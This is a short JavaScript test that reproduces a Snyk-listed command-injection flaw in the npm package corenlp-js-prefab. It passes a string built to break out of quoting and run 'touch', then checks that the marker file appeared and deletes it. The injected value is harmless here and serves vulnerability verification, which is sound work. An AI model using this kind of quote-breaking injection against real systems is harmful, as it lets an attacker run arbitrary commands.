//https://snyk.io/vuln/SNYK-JS-CORENLPJSPREFAB-1050434
test("Command Injection in corenlp-js-prefab", () => {
  const a = require("corenlp-js-prefab");
  const fs = require("fs");
  const path = "./corenlp-js-prefab";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    a.process("') touch corenlp-js-prefab # '");
  } catch (error) {
    console.log("error");
  }

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
